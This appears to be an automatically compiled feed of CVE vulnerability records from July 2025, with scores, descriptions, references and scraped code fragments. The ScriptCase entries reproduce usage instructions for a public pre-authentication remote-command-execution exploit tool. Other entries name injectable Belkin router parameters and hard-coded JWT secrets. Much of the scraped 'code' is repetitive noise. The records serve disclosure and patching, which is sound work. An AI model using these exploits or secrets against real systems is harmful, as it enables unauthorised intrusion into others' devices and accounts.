CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A vulnerability was found in Belkin F9K1122 1.00.33 and classified as critical. Affected by this issue is the function formBSSetSitesurvey of the file /goform/formBSSetSitesurvey of the component webs. The manipulation of the argument wan_ipaddr/wan_netmask/wan_gateway/wl_ssid is directly passed by the attacker/so we can control the wan_ipaddr/wan_netmask/wan_gateway/wl_ssid leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_2/2.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_2/2.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314996 [Permissions Required]
  4. https://vuldb.com/?id.314996 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603672 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314996 ---
formBSSetSitesurvey

formBSSetSitesurvey

wan_ipaddr/wan_netmask/wan_gateway/wl_ssid is directly passed by the attacker/so we can control the wan_ipaddr/wan_netmask/wan_gateway/wl_ssid

================================================================================


CVE ID: CVE-2025-7081
Published: 2025-07-06T14:15:28.413
Modified: 2025-07-09T17:35:47.690
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A vulnerability has been found in Belkin F9K1122 1.00.33 and classified as critical. Affected by this vulnerability is the function formSetWanStatic of the file /goform/formSetWanStatic of the component webs. The manipulation of the argument m_wan_ipaddr/m_wan_netmask/m_wan_gateway/m_wan_staticdns1/m_wan_staticdns2 is directly passed by the attacker/so we can control the m_wan_ipaddr/m_wan_netmask/m_wan_gateway/m_wan_staticdns1/m_wan_staticdns2 leads to os command injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_1/1.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_1/1.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314995 [Permissions Required]
  4. https://vuldb.com/?id.314995 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603669 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314995 ---
formSetWanStatic

formSetWanStatic

m_wan_ipaddr/m_wan_netmask/m_wan_gateway/m_wan_staticdns1/m_wan_staticdns2 is directly passed by the attacker/so we can control the m_wan_ipaddr/m_wan_netmask/m_wan_gateway/m_wan_staticdns1/m_wan_staticdns2

================================================================================


CVE ID: CVE-2025-7080
Published: 2025-07-06T14:15:28.203
Modified: 2025-07-08T16:18:34.923
CVSS Score: 3.7 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-255: CWE-255
  - CWE-259: CWE-259

Description:
A vulnerability, which was classified as problematic, was found in Done-0 Jank up to 322caebbad10568460364b9667aa62c3080bfc17. Affected is an unknown function of the file internal/utils/jwt_utils.go of the component JWT Token Handler. The manipulation of the argument accessSecret/refreshSecret with the input jank-blog-secret/jank-blog-refresh-secret leads to use of hard-coded password. It is possible to launch the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. Continious delivery with rolling releases is used by this product. Therefore, no version details of affected nor updated releases are available.

References (4):
  1. https://github.com/Done-0/Jank/issues/9
  2. https://vuldb.com/?ctiid.314994
  3. https://vuldb.com/?id.314994
  4. https://vuldb.com/?submit.603746

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314994 ---
jank-blog-secret/jank-blog-refresh-secret

accessSecret/refreshSecret

jank-blog-secret/jank-blog-refresh-secret

================================================================================


CVE ID: CVE-2025-7079
Published: 2025-07-06T13:15:35.413
Modified: 2025-07-08T16:18:34.923
CVSS Score: 3.7 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-255: CWE-255
  - CWE-259: CWE-259

Description:
A vulnerability, which was classified as problematic, has been found in mao888 bluebell-plus up to 2.3.0. This issue affects some unknown processing of the file bluebell_backend/pkg/jwt/jwt.go of the component JWT Token Handler. The manipulation of the argument mySecret with the input bluebell-plus leads to use of hard-coded password. The attack may be initiated remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/mao888/bluebell-plus/issues/35
  2. https://vuldb.com/?ctiid.314993
  3. https://vuldb.com/?id.314993
  4. https://vuldb.com/?submit.603726
  5. https://github.com/mao888/bluebell-plus/issues/35

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314993 ---
bluebell-plus

mySecret

bluebell-plus

================================================================================


CVE ID: CVE-2025-7077
Published: 2025-07-06T07:15:35.383
Modified: 2025-08-20T16:30:10.253
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability classified as critical has been found in Shenzhen Libituo Technology LBT-T300-T310 up to 2.2.3.6. This affects the function config_3g_para of the file /appy.cgi. The manipulation of the argument username_3g/password_3g leads to buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. Other parameters might be affected as well. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/FLY200503/IoT-vul/tree/master/LBT-T300 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314991 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.314991 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603012 [Third Party Advisory, VDB Entry]
  5. https://github.com/FLY200503/IoT-vul/tree/master/LBT-T300 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314991 ---
config_3g_para

config_3g_para

username_3g/password_3g

================================================================================


CVE ID: CVE-2025-7074
Published: 2025-07-05T09:15:27.913
Modified: 2025-07-08T16:18:53.607
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-400: Uncontrolled Resource Consumption
  - CWE-1333: CWE-1333

Description:
A vulnerability classified as problematic has been found in vercel hyper up to 3.4.1. This affects the function expand/braceExpand/ignoreMap of the file hyper/bin/rimraf-standalone.js. The manipulation leads to inefficient regular expression complexity. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/vercel/hyper/issues/8098
  2. https://vuldb.com/?ctiid.314973
  3. https://vuldb.com/?id.314973
  4. https://vuldb.com/?submit.602353
  5. https://github.com/vercel/hyper/issues/8098

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314973 ---
expand/braceExpand/ignoreMap

expand/braceExpand/ignoreMap

================================================================================


CVE ID: CVE-2025-47228
Published: 2025-07-05T03:15:30.637
Modified: 2025-07-08T16:18:53.607
CVSS Score: 6.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L

CWE Categories:
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
In the Production Environment extension in Netmake ScriptCase through 9.12.006 (23), shell injection in the SSH connection settings allows authenticated attackers to execute system commands via crafted HTTP requests.

References (4):
  1. https://github.com/synacktiv/CVE-2025-47227_CVE-2025-47228
  2. https://www.scriptcase.net/changelog/
  3. https://www.synacktiv.com/advisories/scriptcase-pre-authenticated-remote-command-execution
  4. https://github.com/synacktiv/CVE-2025-47227_CVE-2025-47228

Attempting to extract code examples from references...

--- Code from https://github.com/synacktiv/CVE-2025-47227_CVE-2025-47228 ---
<span class="pl-c"><span class="pl-c">#</span> pip - universal</span>
pip3 install Pillow pytesseract requests beautifulsoup4

<span class="pl-c"><span class="pl-c">#</span> pacman - Arch Linux</span>
pacman -S python-pillow python-pytesseract python-requests python-beautifulsoup4

Usage:
  Examples:

  Pre-Auth RCE (password reset + RCE)
    python exploit.py -u http://example.org/scriptcase -c "command"
  Password reset only (no auth)
    python exploit.py -u http://example.org/scriptcase
  RCE only (need account)
    python exploit.py -u http://example.org/scriptcase -c "command" -p 'Password123*'
  Detect deployment path
    python exploit.py -u http://example.org/ -d


Options:
  -h, --help            show this help message and exit
  -u BASE_URL, --base-url=BASE_URL
  -c COMMAND, --command=COMMAND
  -p PASSWORD, --password=PASSWORD
  -d, --detect


================================================================================


CVE ID: CVE-2025-47227
Published: 2025-07-05T03:15:30.470
Modified: 2025-07-08T16:18:53.607
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N

CWE Categories:
  - CWE-684: CWE-684

Description:
In the Production Environment extension in Netmake ScriptCase through 9.12.006 (23), the Administrator password reset mechanism is mishandled. Making both a GET and a POST request to login.php.is sufficient. An unauthenticated attacker can then bypass authentication via administrator account takeover.

References (4):
  1. https://github.com/synacktiv/CVE-2025-47227_CVE-2025-47228
  2. https://www.scriptcase.net/changelog/
  3. https://www.synacktiv.com/advisories/scriptcase-pre-authenticated-remote-command-execution
  4. https://github.com/synacktiv/CVE-2025-47227_CVE-2025-47228

Attempting to extract code examples from references...

--- Code from https://github.com/synacktiv/CVE-2025-47227_CVE-2025-47228 ---
<span class="pl-c"><span class="pl-c">#</span> pip - universal</span>
pip3 install Pillow pytesseract requests beautifulsoup4

<span class="pl-c"><span class="pl-c">#</span> pacman - Arch Linux</span>
pacman -S python-pillow python-pytesseract python-requests python-beautifulsoup4

Usage:
  Examples:

  Pre-Auth RCE (password reset + RCE)
    python exploit.py -u http://example.org/scriptcase -c "command"
  Password reset only (no auth)
    python exploit.py -u http://example.org/scriptcase
  RCE only (need account)
    python exploit.py -u http://example.org/scriptcase -c "command" -p 'Password123*'
  Detect deployment path
    python exploit.py -u http://example.org/ -d


Options:
  -h, --help            show this help message and exit
  -u BASE_URL, --base-url=BASE_URL
  -c COMMAND, --command=COMMAND
  -p PASSWORD, --password=PASSWORD
  -d, --detect


================================================================================


CVE ID: CVE-2025-53605
Published: 2025-07-05T01:15:28.523
Modified: 2025-07-08T16:18:53.607
CVSS Score: 5.9 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-674: CWE-674

Description:
The protobuf crate before 3.7.2 for Rust allows uncontrolled recursion in the protobuf::coded_input_stream::CodedInputStream::skip_group parsing of unknown fields in untrusted input.

References (3):
  1. https://crates.io/crates/protobuf
  2. https://github.com/stepancheg/rust-protobuf/issues/749
  3. https://rustsec.org/advisories/RUSTSEC-2024-0437

Attempting to extract code examples from references...

--- Code from https://rustsec.org/advisories/RUSTSEC-2024-0437 ---
&#62;=3.7.2

protobuf::coded_input_stream::CodedInputStream::skip_group

&#60;=3.4.0

================================================================================


CVE ID: CVE-2025-53604
Published: 2025-07-05T01:15:28.340
Modified: 2025-07-08T16:18:53.607
CVSS Score: 4.0 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:N/A:L

CWE Categories:
  - CWE-130: CWE-130

Description:
The web-push crate before 0.10.3 for Rust allows a denial of service (memory consumption) in the built-in clients via a large integer in a Content-Length header.

References (3):
  1. https://crates.io/crates/web-push
  2. https://github.com/pimeys/rust-web-push/pull/68
  3. https://rustsec.org/advisories/RUSTSEC-2025-0015.html

Attempting to extract code examples from references...

--- Code from https://rustsec.org/advisories/RUSTSEC-2025-0015.html ---
&#62;=0.10.3

web-push

Content-Length

================================================================================


CVE ID: CVE-2025-53603
Published: 2025-07-05T01:15:27.360
Modified: 2025-07-08T16:18:53.607
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-476: NULL Pointer Dereference

Description:
In Alinto SOPE SOGo 2.0.2 through 5.12.2, sope-core/NGExtensions/NGHashMap.m allows a NULL pointer dereference and SOGo crash via a request in which a parameter in the query string is a duplicate of a parameter in the POST body.

References (5):
  1. https://github.com/Alinto/sope/blob/3146fbdb6ff3314e37e5c3682deeeef7d0f32064/sope-core/NGExtensions/NGHashMap.m#L790
  2. https://github.com/Alinto/sope/compare/SOGo-2.0.1...SOGo-2.0.2
  3. https://github.com/Alinto/sope/pull/69
  4. https://www.openwall.com/lists/oss-security/2025/07/02/3
  5. https://www.openwall.com/lists/oss-security/2025/07/02/3

Attempting to extract code examples from references...

--- Code from https://github.com/Alinto/sope/compare/SOGo-2.0.1...SOGo-2.0.2 ---
git diff SOGo-2.0.1...SOGo-2.0.2

================================================================================


CVE ID: CVE-2025-43711
Published: 2025-07-05T00:15:23.733
Modified: 2025-07-08T16:18:53.607
CVSS Score: 8.1 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-459: CWE-459

Description:
Tunnelblick 3.5beta06 before 7.0, when incompletely uninstalled, allows attackers to execute arbitrary code as root (upon the next boot) by dragging a crafted Tunnelblick.app file into /Applications.

References (2):
  1. https://tunnelblick.net/cCVE-2025-43711.html
  2. https://tunnelblick.net/downloads.html

Attempting to extract code examples from references...

--- Code from https://tunnelblick.net/cCVE-2025-43711.html ---
/Library/LaunchDaemons/net.tunnelblick.tunnelblick.tunnelblickd.plist

/Library/LaunchDaemons/net.tunnelblick.tunnelblick.tunnelblickd.plist

================================================================================


CVE ID: CVE-2025-7069
Published: 2025-07-04T21:15:23.967
Modified: 2025-07-09T17:39:22.543
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-122: CWE-122

Description:
A vulnerability, which was classified as problematic, was found in HDF5 1.14.6. Affected is the function H5FS__sect_link_size of the file src/H5FSsection.c. The manipulation leads to heap-based buffer overflow. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/HDFGroup/hdf5/issues/5550 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://github.com/user-attachments/files/20438481/hdf5_crash_2.txt [Exploit]
  3. https://vuldb.com/?ctiid.314904 [Permissions Required]
  4. https://vuldb.com/?id.314904 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602538 [Third Party Advisory, VDB Entry]
  6. https://github.com/HDFGroup/hdf5/issues/5550 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/HDFGroup/hdf5/issues/5550 ---
H5FS__sect_link_size

src/H5FSsection.c:935:26

H5FS__sect_link_size

================================================================================


CVE ID: CVE-2025-7068
Published: 2025-07-04T21:15:23.770
Modified: 2025-07-09T17:36:15.320
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-401: Missing Release of Memory after Effective Lifetime
  - CWE-404: CWE-404

Description:
A vulnerability, which was classified as problematic, has been found in HDF5 1.14.6. This issue affects the function H5FL__malloc of the file src/H5FL.c. The manipulation leads to memory leak. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/HDFGroup/hdf5/issues/5578 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://github.com/user-attachments/files/20623530/hdf5_crash_10.txt [Exploit]
  3. https://vuldb.com/?ctiid.314903 [Permissions Required]
  4. https://vuldb.com/?id.314903 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602537 [Third Party Advisory, VDB Entry]
  6. https://github.com/HDFGroup/hdf5/issues/5578 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/HDFGroup/hdf5/issues/5578 ---
H5FL__malloc

src/H5FL.c:211:30

H5FL__malloc

================================================================================


CVE ID: CVE-2025-53602
Published: 2025-07-04T21:15:23.560
Modified: 2025-07-08T16:18:53.607
CVSS Score: 5.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-1188: CWE-1188

Description:
Zipkin through 3.5.1 has a /heapdump endpoint (associated with the use of Spring Boot Actuator), a similar issue to CVE-2025-48927.

References (3):
  1. https://github.com/openzipkin/zipkin/commit/3c7605dfdfab2dd341cf0ea121a56cefcd580d9e
  2. https://github.com/openzipkin/zipkin/pull/3804
  3. https://zipkin.io/

Attempting to extract code examples from references...

--- Code from https://github.com/openzipkin/zipkin/commit/3c7605dfdfab2dd341cf0ea121a56cefcd580d9e ---
From 3c7605dfdfab2dd341cf0ea121a56cefcd580d9e Mon Sep 17 00:00:00 2001
From: Andriy Redko <drreta@gmail.com>
Date: Fri, 13 Jun 2025 20:35:39 -0400
Subject: [PATCH] Disable Spring Boot Actuator /heapdump endpoint (#3804)

Disable Spring Boot Actuator /heapdump endpoint

Signed-off-by: Andriy Redko <drreta@gmail.com>
---
 docker/test-images/zipkin-mysql/Dockerfile                | 2 +-
 zipkin-server/src/main/resources/zipkin-server-shared.yml | 2 +-
 2 files changed, 2 insertions(+), 2 deletions(-)

diff --git a/docker/test-images/zipkin-mysql/Dockerfile b/docker/test-images/zipkin-mysql/Dockerfile
index c91ff6fe68..d0639b792e 100644
--- a/docker/test-images/zipkin-mysql/Dockerfile
+++ b/docker/test-images/zipkin-mysql/Dockerfile
@@ -28,7 +28,7 @@ HEALTHCHECK --interval=1s --start-period=30s --timeout=5s CMD ["docker-healthche
 ENTRYPOINT ["start-mysql"]
 
 # Use latest from https://pkgs.alpinelinux.org/packages?name=mysql (without the -r[0-9])
-ARG mysql_version=11.4.5-r2
+ARG mysql_version=11.4.7-r0
 LABEL mysql-version=$mysql_version
 ENV MYSQL_VERSION=$mysql_version
 
diff --git a/zipkin-server/src/main/resources/zipkin-server-shared.yml b/zipkin-server/src/main/resources/zipkin-server-shared.yml
index 4dcf40d2ac..7b9d3345b2 100644
--- a/zipkin-server/src/main/resources/zipkin-server-shared.yml
+++ b/zipkin-server/src/main/resources/zipkin-server-shared.yml
@@ -106,7 +106,6 @@ zipkin:
         - org.springframework.boot.actuate.autoconfigure.context.properties.ConfigurationPropertiesReportEndpointAutoConfiguration
         - org.springframework.boot.actuate.autoconfigure.endpoint.EndpointAutoConfiguration
         - org.springframework.boot.actuate.autoconfigure.env.EnvironmentEndpointAutoConfiguration
-        - org.springframework.boot.actuate.autoconfigure.management.HeapDumpWebEndpointAutoConfiguration
         - org.springframework.boot.actuate.autoconfigure.logging.LoggersEndpointAutoConfiguration
         - org.springframework.boot.actuate.autoconfigure.management.ThreadDumpEndpointAutoConfiguration
 
@@ -232,6 +231,7 @@ spring:
     # NOTE: These exclusions can drift between Spring Boot minor versions. Audit accordingly.
     # Ex. curl -s localhost:9411/actuator/beans|jq '.contexts.application.beans|keys_unsorted[]'|sort
     exclude:
+      - org.springframework.boot.actuate.autoconfigure.management.HeapDumpWebEndpointAutoConfiguration
       # JMX is disabled
       - org.springframework.boot.actuate.autoconfigure.endpoint.jmx.JmxEndpointAutoConfiguration
       # /health and /actuator/health served directly by Armeria


================================================================================


CVE ID: CVE-2025-7067
Published: 2025-07-04T18:15:23.610
Modified: 2025-07-09T17:36:25.073
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-122: CWE-122

Description:
A vulnerability classified as problematic was found in HDF5 1.14.6. This vulnerability affects the function H5FS__sinfo_serialize_node_cb of the file src/H5FScache.c. The manipulation leads to heap-based buffer overflow. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/HDFGroup/hdf5/issues/5577 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://github.com/user-attachments/files/20623499/hdf5_crash_9.txt [Exploit]
  3. https://vuldb.com/?ctiid.314902 [Permissions Required]
  4. https://vuldb.com/?id.314902 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602536 [Third Party Advisory, VDB Entry]
  6. https://github.com/HDFGroup/hdf5/issues/5577 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/HDFGroup/hdf5/issues/5577 ---
H5FS__sinfo_serialize_node_cb

src/H5FScache.c:1441:9

H5FS__sinfo_serialize_node_cb

================================================================================


CVE ID: CVE-2025-46733
Published: 2025-07-04T14:15:33.217
Modified: 2025-07-08T16:18:53.607
CVSS Score: 7.9 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L

CWE Categories:
  - CWE-755: CWE-755

Description:
OP-TEE is a Trusted Execution Environment (TEE) designed as companion to a non-secure Linux kernel running on Arm; Cortex-A cores using the TrustZone technology. In version 4.5.0, using a specially crafted tee-supplicant binary running in REE userspace, an attacker can trigger a panic in a TA that uses the libutee Secure Storage API. Many functions in libutee, specifically those which make up the Secure Storage API, will panic if a system call returns an unexpected return code. This behavior is mandated by the TEE Internal Core API specification. However, in OP-TEE’s implementation, return codes of secure storage operations are passed through unsanitized from the REE tee-supplicant, through the Linux kernel tee-driver, through the OP-TEE kernel, back to libutee. Thus, an attacker with access to REE userspace, and the ability to stop tee-supplicant and replace it with their own process (generally trivial for a root user, and depending on the way permissions are set up, potentially available even to less privileged users) can run a malicious tee-supplicant process that responds to storage requests with unexpected response codes, triggering a panic in the requesting TA. This is particularly dangerous for TAs built with `TA_FLAG_SINGLE_INSTANCE` (corresponding to `gpd.ta.singleInstance` and `TA_FLAG_INSTANCE_KEEP_ALIVE` (corresponding to `gpd.ta.keepAlive`). The behavior of these TAs may depend on memory that is preserved between sessions, and the ability of an attacker to panic the TA and reload it with a clean memory space can compromise the behavior of those TAs. A critical example of this is the optee_ftpm TA. It uses the kept alive memory to hold PCR values, which crucially must be non-resettable. An attacker who can trigger a panic in the fTPM TA can reset the PCRs, and then extend them PCRs with whatever they choose, falsifying boot measurements, accessing sealed data, and potentially more. The impact of this issue depends significantly on the behavior of affected TAs. For some, it could manifest as a denial of service, while for others, like the fTPM TA, it can result in the disclosure of sensitive data. Anyone running the fTPM TA is affected, but similar attacks may be possible on other TAs that leverage the Secure Storage API. A fix is available in commit 941a58d78c99c4754fbd4ec3079ec9e1d596af8f.

References (3):
  1. https://github.com/OP-TEE/optee_os/commit/941a58d78c99c4754fbd4ec3079ec9e1d596af8f
  2. https://github.com/OP-TEE/optee_os/security/advisories/GHSA-f35r-hm2m-p6c3
  3. https://github.com/OP-TEE/optee_os/security/advisories/GHSA-f35r-hm2m-p6c3

Attempting to extract code examples from references...

--- Code from https://github.com/OP-TEE/optee_os/commit/941a58d78c99c4754fbd4ec3079ec9e1d596af8f ---
From 941a58d78c99c4754fbd4ec3079ec9e1d596af8f Mon Sep 17 00:00:00 2001
From: Jens Wiklander <jens.wiklander@linaro.org>
Date: Fri, 4 Apr 2025 10:24:34 +0200
Subject: [PATCH] Add optee.ta.instanceKeepCrashed property

Add the optee.ta.instanceKeepCrashed property to prevent a TA with
gpd.ta.instanceKeepAlive=true to be restarted. This prevents unexpected
resetting of the state of the TA.

Signed-off-by: Jens Wiklander <jens.wiklander@linaro.org>
Reviewed-by: Jerome Forissier <jerome.forissier@linaro.org>
Reviewed-by: Alex Lewontin <alex.lewontin@canonical.com>
Reviewed-by: Etienne Carriere <etienne.carriere@foss.st.com>
---
 core/kernel/tee_ta_manager.c         | 10 +++++++---
 lib/libutee/include/user_ta_header.h |  8 +++++++-
 ta/user_ta_header.c                  |  3 +++
 3 files changed, 17 insertions(+), 4 deletions(-)

diff --git a/core/kernel/tee_ta_manager.c b/core/kernel/tee_ta_manager.c
index e4740468873..75e55a8e475 100644
--- a/core/kernel/tee_ta_manager.c
+++ b/core/kernel/tee_ta_manager.c
@@ -455,6 +455,7 @@ TEE_Result tee_ta_close_session(struct tee_ta_session *csess,
 	struct tee_ta_session *sess = NULL;
 	struct tee_ta_ctx *ctx = NULL;
 	struct ts_ctx *ts_ctx = NULL;
+	bool keep_crashed = false;
 	bool keep_alive = false;
 
 	DMSG("csess 0x%" PRIxVA " id %u",
@@ -501,9 +502,12 @@ TEE_Result tee_ta_close_session(struct tee_ta_session *csess,
 		panic();
 
 	ctx->ref_count--;
-	keep_alive = (ctx->flags & TA_FLAG_INSTANCE_KEEP_ALIVE) &&
-			(ctx->flags & TA_FLAG_SINGLE_INSTANCE);
-	if (!ctx->ref_count && (ctx->panicked || !keep_alive)) {
+	if (ctx->flags & TA_FLAG_SINGLE_INSTANCE)
+		keep_alive = ctx->flags & TA_FLAG_INSTANCE_KEEP_ALIVE;
+	if (keep_alive)
+		keep_crashed = ctx->flags & TA_FLAG_INSTANCE_KEEP_CRASHED;
+	if (!ctx->ref_count &&
+	    ((ctx->panicked && !keep_crashed) || !keep_alive)) {
 		if (!ctx->is_releasing) {
 			TAILQ_REMOVE(&tee_ctxes, ctx, link);
 			ctx->is_releasing = true;
diff --git a/lib/libutee/include/user_ta_header.h b/lib/libutee/include/user_ta_header.h
index 0336c64b2f7..c5622982f2e 100644
--- a/lib/libutee/include/user_ta_header.h
+++ b/lib/libutee/include/user_ta_header.h
@@ -52,8 +52,13 @@
 					BIT32(11)
 #define TA_FLAG_DEVICE_ENUM_TEE_STORAGE_PRIVATE	\
 					BIT32(12) /* with TEE_STORAGE_PRIVATE */
+/*
+ * Don't restart a TA with TA_FLAG_INSTANCE_KEEP_ALIVE set if it has
+ * crashed.
+ */
+#define TA_FLAG_INSTANCE_KEEP_CRASHED	BIT32(13)
 
-#define TA_FLAGS_MASK			GENMASK_32(12, 0)
+#define TA_FLAGS_MASK			GENMASK_32(13, 0)
 
 struct ta_head {
 	TEE_UUID uuid;
@@ -133,6 +138,7 @@ extern struct __elf_phdr_info __elf_phdr_info;
 #define TA_PROP_STR_SINGLE_INSTANCE	"gpd.ta.singleInstance"
 #define TA_PROP_STR_MULTI_SESSION	"gpd.ta.multiSession"
 #define TA_PROP_STR_KEEP_ALIVE		"gpd.ta.instanceKeepAlive"
+#define TA_PROP_STR_KEEP_CRASHED	"optee.ta.instanceKeepCrashed"
 #define TA_PROP_STR_DATA_SIZE		"gpd.ta.dataSize"
 #define TA_PROP_STR_STACK_SIZE		"gpd.ta.stackSize"
 #define TA_PROP_STR_VERSION		"gpd.ta.version"
diff --git a/ta/user_ta_header.c b/ta/user_ta_header.c
index 3125af55c44..aa804c1efaa 100644
--- a/ta/user_ta_header.c
+++ b/ta/user_ta_header.c
@@ -142,6 +142,9 @@ const struct user_ta_property ta_props[] = {
 	{TA_PROP_STR_KEEP_ALIVE, USER_TA_PROP_TYPE_BOOL,
 	 &(const bool){(TA_FLAGS & TA_FLAG_INSTANCE_KEEP_ALIVE) != 0}},
 
+	{TA_PROP_STR_KEEP_CRASHED, USER_TA_PROP_TYPE_BOOL,
+	 &(const bool){(TA_FLAGS & TA_FLAG_INSTANCE_KEEP_CRASHED) != 0}},
+
 	{TA_PROP_STR_DATA_SIZE, USER_TA_PROP_TYPE_U32,
 	 &(const uint32_t){TA_DATA_SIZE}},
 


================================================================================


CVE ID: CVE-2025-49809
Published: 2025-07-04T13:15:25.780
Modified: 2025-07-08T16:18:53.607
CVSS Score: 7.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-829: CWE-829

Description:
mtr through 0.95, in certain privileged contexts, mishandles execution of a program specified by the MTR_PACKET environment variable. NOTE: mtr on macOS may often have Sudo rules, as an indirect consequence of Homebrew not installing setuid binaries.

References (4):
  1. https://github.com/Homebrew/homebrew-core/issues/35085
  2. https://github.com/traviscross/mtr/blob/master/SECURITY
  3. https://github.com/traviscross/mtr/commit/5226f105f087c29d3cfad9f28000e7536af91ac6
  4. https://github.com/traviscross/mtr/blob/master/SECURITY

Attempting to extract code examples from references...

--- Code from https://github.com/traviscross/mtr/commit/5226f105f087c29d3cfad9f28000e7536af91ac6 ---
From 5226f105f087c29d3cfad9f28000e7536af91ac6 Mon Sep 17 00:00:00 2001
From: "R.E. Wolff" <R.E.Wolff@BitWizard.nl>
Date: Sun, 29 Jun 2025 14:06:00 +0200
Subject: [PATCH] Added protection against use of MTR_PACKET under special
 circumstances

---
